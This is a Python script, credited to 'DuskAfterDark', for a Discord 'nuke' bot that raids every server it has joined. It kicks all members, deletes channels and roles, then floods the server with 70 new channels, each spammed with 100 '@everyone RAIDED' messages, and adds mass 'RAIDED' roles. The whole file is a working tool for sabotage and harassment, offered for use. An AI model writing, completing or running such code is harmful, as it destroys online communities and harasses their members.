# Discord Nuke Bot 
# Script created by DuskAfterDark

import discord
from discord.ext import commands
import asyncio
from colorama import Fore, init

init(autoreset=True)
intents = discord.Intents.default()
intents.members = True  
intents.guilds = True  


bot_ascii_art = """
·▄▄▄▄  ▄• ▄▌.▄▄ · ▄ •▄  ▄▄▄· ·▄▄▄▄▄▄▄▄▄▄▄ .▄▄▄  ·▄▄▄▄   ▄▄▄· ▄▄▄  ▄ •▄ 
██▪ ██ █▪██▌▐█ ▀. █▌▄▌▪▐█ ▀█ ▐▄▄·•██  ▀▄.▀·▀▄ █·██▪ ██ ▐█ ▀█ ▀▄ █·█▌▄▌▪
▐█· ▐█▌█▌▐█▌▄▀▀▀█▄▐▀▀▄·▄█▀▀█ ██▪  ▐█.▪▐▀▀▪▄▐▀▀▄ ▐█· ▐█▌▄█▀▀█ ▐▀▀▄ ▐▀▀▄·
██. ██ ▐█▄█▌▐█▄▪▐█▐█.█▌▐█ ▪▐▌██▌. ▐█▌·▐█▄▄▌▐█•█▌██. ██ ▐█ ▪▐▌▐█•█▌▐█.█▌
▀▀▀▀▀•  ▀▀▀  ▀▀▀▀ ·▀  ▀ ▀  ▀ ▀▀▀  ▀▀▀  ▀▀▀ .▀  ▀▀▀▀▀▀•  ▀  ▀ .▀  ▀·▀  ▀   
  Created by: DuskAfterDark
                                                                         """

# main
bot = commands.Bot(command_prefix='!', intents=intents)

@bot.event
async def on_ready():
    print(Fore.LIGHTWHITE_EX + bot_ascii_art)  
    print(Fore.LIGHTGREEN_EX + f'Logged in as {bot.user.name}')
    print(Fore.YELLOW + f'Bot ID: {bot.user.id}')
    print(Fore.LIGHTMAGENTA_EX + 'Connected to the following guilds:')
    
    for guild in bot.guilds:
        print(Fore.BLUE + f' - {guild.name} (ID: {guild.id})')
    confirm = input(Fore.WHITE + "Start bot operations? (yes/no): ").strip().lower()
    if confirm != "yes":
        print(Fore.RED + "Bot operations canceled.")
        return

    print(Fore.GREEN + "Starting bot operations...")
    await asyncio.gather(*(perform_guild_operations(guild) for guild in bot.guilds))

# unbanable
USER_ID = [
    0,  
    0   
]

async def perform_guild_operations(guild):
    print(f"\nPerforming operations in guild: {guild.name}")
    kick_task = kick_members(guild)
    delete_channels_task = delete_channels(guild)
    delete_roles_task = delete_roles(guild)
    await asyncio.gather(kick_task, delete_channels_task, delete_roles_task)
    create_channels_task = create_channels(guild)
    create_roles_task = create_roles(guild)
    await asyncio.gather(create_channels_task, create_roles_task)

async def kick_members(guild):
    print("Kicking members...")
    members = [member for member in guild.members if member != bot.user]
    for member in members:
        if member.id in USER_ID:
            print(f"Skipping {member.name} (User is excluded from kicking)")
            continue
        try:
            await member.kick(reason="Kicking all members")
            print(f"Kicked member: {member.name}")
        except discord.Forbidden:
            print(f"Failed to kick {member.name} due to missing permissions.")
        except discord.HTTPException as e:
            print(f"Failed to kick {member.name} due to an HTTP error: {e}")

async def delete_channels(guild):
    print("Deleting channels...")
    for channel in guild.channels:
        try:
            await channel.delete()
            print(f"Deleted channel: {channel.name}")
        except discord.Forbidden:
            print(f"Failed to delete {channel.name} due to missing permissions.")
        except discord.HTTPException as e:
            print(f"Failed to delete {channel.name} due to an HTTP error: {e}")

async def delete_roles(guild):
    print("Deleting roles...")
    roles = [role for role in guild.roles if role != guild.default_role and role.position < guild.me.top_role.position]
    for role in roles:
        try:
            await role.delete()
            print(f"Deleted role: {role.name}")
        except discord.Forbidden:
            print(f"Failed to delete {role.name} due to missing permissions.")
        except discord.HTTPException as e:
            print(f"Failed to delete {role.name} due to an HTTP error: {e}")

async def create_channels(guild):
    print("Creating channels and sending messages...")
    for _ in range(70):  
        try:
            new_channel = await guild.create_text_channel('HI')
            print(f"Created new channel: {new_channel.name}")
            bot.loop.create_task(spam_messages(new_channel))
        except discord.Forbidden:
            print(f"Failed to create channel due to missing permissions.")
        except discord.HTTPException as e:
            print(f"Failed to create channel due to an HTTP error: {e}")

async def spam_messages(channel):
    for _ in range(100):  
        try:
            await channel.send('@everyone RAIDED XDDDDDDDDDD')
            print(f"Sent spam message in {channel.name}")
            await asyncio.sleep(0.1) 
        except discord.Forbidden:
            print(f"Failed to send message in {channel.name} due to missing permissions.")
        except discord.HTTPException as e:
            print(f"Failed to send message in {channel.name} due to an HTTP error: {e}")

async def create_roles(guild):
    print("Creating roles...")
    role_creation_tasks = []
    for _ in range(10):  
        role_creation_tasks.append(create_role(guild))
    await asyncio.gather(*role_creation_tasks)

async def create_role(guild):
    try:
        new_role = await guild.create_role(name='RAIDED')
        print(f"Created new role: {new_role.name}")
    except discord.Forbidden:
        print("Failed to create role due to missing permissions.")
    except discord.HTTPException as e:
        print(f"Failed to create role due to an HTTP error: {e}")

# token
bot.run('0')
